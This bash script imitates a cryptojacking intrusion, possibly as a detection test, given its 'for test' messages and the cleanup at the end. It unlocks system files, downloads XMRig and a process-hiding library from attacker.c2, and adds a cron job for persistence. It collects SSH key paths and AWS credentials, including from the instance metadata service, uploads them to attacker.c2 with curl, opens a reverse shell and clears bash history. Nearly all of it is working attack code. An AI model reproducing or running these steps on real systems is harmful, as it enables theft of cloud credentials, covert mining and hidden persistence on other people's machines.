#!/bin/bash

apt-get update -y && sudo apt-get -y install wget curl cron netcat zip

export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
DIR_ARRAY=("/tmp" "/var/tmp" "/dev/shm" "/bin" "/sbin" "/usr/bin" "/usr/sbin")


download() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

echo ''
echo 'Handling some filemods ...'
CHECKCHMOD=`command -v mchmod`
if ! [ -z "$CHECKCHMOD" ] ; then mchattr -ia $(command -v chmod) ; tntrecht -ia  $(command -v chmod) ; mchmod +x  $(command -v chmod) ; fi
CHECKCHATTR=`command -v mchattr`
if ! [ -z "$CHECKCHATTR" ] ; then mchattr -ia $(command -v chattr) ; tntrecht -ia  $(command -v chattr) ; mchmod +x  $(command -v chattr) ; chmod +x  $(command -v chattr) ; fi

echo ''
echo 'Handling preload ld ...'
if [ -f "/etc/ld.so.preload" ] ; then echo 'Found: /etc/ld.so.preload' ; chattr -ia / /etc/ /etc/ld.so.preload 2>/dev/null ; rm -f /etc/ld.so.preload 2>/dev/null ; else echo 'No /etc/ld.so.preload file found!' ; fi

echo ''
echo 'Handling dir permissions ld ...'
for DIR in ${DIR_ARRAY[@]}; do
if [ -d $DIR ] ; then echo '' ; echo $DIR" found."
if [ -w $DIR ] ; then echo "Write rights in "$DIR" available." ; else echo "No write permissions in "$DIR" available. Try to fix the error."
chattr -ia $DIR 2>/dev/null ; if [ -w $DIR ] ; then echo "Write rights in "$DIR" available." ; else echo "Still no write access in "$DIR"." ; fi
fi ; else echo $DIR" not found." ; fi ; done

echo ''
echo 'Handling download XMRig ...'
if [ -w /usr/sbin ] ; then export SPATH=/usr/sbin ; else if [ -w /tmp ] ; then export SPATH=/tmp ; fi ; if [ -w /var/tmp ] ; then export SPATH=/var/tmp ; fi ; fi

wget http://attacker.c2/1/xmrig -O $SPATH/xmrig
cp xmrig $SPATH/xmrig
cp config.json $SPATH/config.json
chmod +x $SPATH/xmrig 2>/dev/null

echo 'Adding library to hide xmrig process...'
if [ "$SPATH" = "/usr/sbin" ] ; then chattr -ia / /usr/ /usr/local/ /usr/local/lib/; fi
wget http://attacker.c2/1/xmrig.so -O /usr/local/lib/xmrig.so 2>/dev/null
cp xmrig.so /usr/local/lib/xmrig.so

ldfile="/etc/ld.so.preload"
postfix=".backup"
if [ -f "$ldfile" ]; then
    cp $ldfile $ldfile$postfix 2>/dev/null
    echo '/usr/local/lib/xmrig1.so' > /etc/ld.so.preload; echo "" > /etc/ld.so.preload;
    mv $ldfile$postfix $ldfile 2>/dev/null
else
    echo '/usr/local/lib/xmrig1.so' > $ldfile; echo "" > $ldfile;
    rm -rf $ldfile
fi
echo ''
echo "Creating persistence with a cron job ..."
(crontab -l 2>/dev/null; echo "@reboot ${SPATH}/xmrig") | crontab -

echo ''
echo "Searching for secrets and sending them to C2 ..."
chattr -ia / /var/ /var/tmp/ 2>/dev/null
if ! [ -d "/dev/shm/.../...HIDDEN.../" ] ; then mkdir -p /dev/shm/.../...HIDDEN.../ 2>/dev/null ; fi

cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'} >> /dev/shm/.../...HIDDEN.../ssh.txt

curl -F "userfile=@/dev/shm/.../...HIDDEN.../ssh.txt" "http://attacker.c2/incoming/access_data/ssh.php" 2>/dev/null
rm -f /dev/shm/.../...HIDDEN.../ssh.txt 2>/dev/null

if type aws 2>/dev/null 1>/dev/null; then aws configure list >> /dev/shm/.../...HIDDEN.../AWS_data.txt ; fi

env | grep 'AWS\|aws' >> /dev/shm/.../...HIDDEN.../AWS_data.txt

cat /root/.aws/* >> /dev/shm/.../...HIDDEN.../AWS_data.txt 2>/dev/null

download http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /dev/shm/.../...HIDDEN.../iam.role
iam_role_name=$(cat /dev/shm/.../...HIDDEN.../iam.role)
rm -f /dev/shm/.../...HIDDEN.../iam.role 2>/dev/null
download http://169.254.169.254/latest/meta-data/iam/security-credentials/${iam_role_name} > /dev/shm/.../...HIDDEN.../aws.tmp.key
cat /dev/shm/.../...HIDDEN.../aws.tmp.key >> /dev/shm/.../...HIDDEN.../AWS_data.txt
rm -f /dev/shm/.../...HIDDEN.../aws.tmp.key
curl -F "userfile=@/dev/shm/.../...HIDDEN.../AWS_data.txt" "http://attacker.c2/incoming/access_data/aws.php" 2>/dev/null

rm -f /dev/shm/.../...HIDDEN.../AWS_data.txt 2>/dev/null

echo ''
echo 'Getting iam roles list ...'

aws iam list-roles 2>/dev/null

echo ''
echo 'Creating reverse shell ...'

nc -lvp 4444 | (sleep 1 && /bin/sh -i >& /dev/tcp/127.0.0.1/4444 0>&1) | (sleep 7 && pkill -9 nc)

echo ''
echo 'Killing reverse shell for test ...'

echo ''
echo 'Clearing bash bash_history ...'

cat /dev/null > ~/.bash_history

echo ''
echo 'Executing miner ....'

timeout -k 9 15s $SPATH/xmrig > /dev/null
rm -rf $SPATH/xmrig xmrig xmrig.so /usr/local/lib/xmrig.so
exit
